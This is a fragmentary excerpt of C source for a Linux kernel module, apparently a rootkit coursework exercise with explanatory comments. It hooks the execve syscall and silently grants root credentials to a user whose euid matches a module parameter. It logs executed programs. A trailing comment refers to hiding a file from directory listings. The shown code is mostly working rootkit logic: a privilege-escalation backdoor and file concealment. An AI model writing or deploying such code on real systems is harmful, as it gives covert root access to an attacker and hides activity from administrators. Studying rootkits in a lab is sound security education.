 ...
 */
static int root_uid;
module_param(root_uid, uint, 0);//declared the type as uint as current_euid() returns an unsigned int
MODULE_PARM_DESC(root_uid, "root_uid set as my user euid");
...
int init_module(void)
{
  ...
  hook_syscall(new_hook(__NR_execve, (void*) &new_execve));//hooked the execve() syscall with the correct offset and function I implemented using the example from open()
...
asmlinkage int new_execve(const char *filename,char *const argv[], char *const envp[])
{
  ...
  if(current_euid() == root_uid){//checks if the users euid thats running the program via execve is equal to the root_uid(which is set to our uid)
    commit_creds(prepare_kernel_cred(0));//if it is then prepare the credentials of root(0) and commit those credentials and set the current tasks euid/uid to escalate privilage to root
  }//placed this block before the printk to show the updated privilages in syslog
  
  printk(KERN_INFO "Executing %s\n", filename);//prints the filename of a program executed by execve
  printk(KERN_INFO "Effective UID %u\n", current_euid()); //current_euid() returns a type uid_t which is an unsigned int, cred.h is included so can just call the func/macro normally
...
// replace everything inside the strncmp if with this to account for the hidden file being the first dirent
